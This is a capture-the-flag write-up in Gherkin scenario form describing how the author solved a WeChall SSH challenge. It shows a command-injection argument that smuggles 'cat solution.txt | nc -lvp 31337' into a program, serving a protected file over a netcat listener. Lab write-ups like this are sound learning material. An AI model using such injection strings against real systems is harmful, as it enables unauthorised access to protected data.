Feature: Solve the challenge Choose your Path
  From www.wechall.net
  With my username SYLAR

  Scenario: Try Failed
    Given a ssh access
        And a source code of charp.c
        And a path ubication
    When I logged into the server
      And I go to the location <</home/level/10/>>
      And I use <<ls -la>> command
      And I see <<charp, charp.c, compile.sh, solution.txt>>
      And I use <<./charp>> program
    Then  I see usage about charp program
        And I use <<./charp solution.txt>>
        But I don't solve the challenge

    Scenario: Try Failed
    Given a ssh access
        And a source code of charp.c
        And a path ubication
        And a SSH session
    When I see the source about charp.c
      And I analyze the code
      And I can see the use of wc command
    Then  I use the command <<./charp cat solution.txt>>
        But I don't solve the challenge

    Scenario: Succesful Solution
    Given a ssh access
        And a source code of charp.c
        And a path ubication
        And a SSH session
    When I see the source about charp.c
      And I analyze the code
      And I can see the use of wc command
    Then  I use  <<./charp "solution.txt;(cat solution.txt | nc -lvp 31337);">>
        And I keep open the file
        And I open other SSH session
        Then I use nc command with localhost and port 31337
        Then I solve the challenge
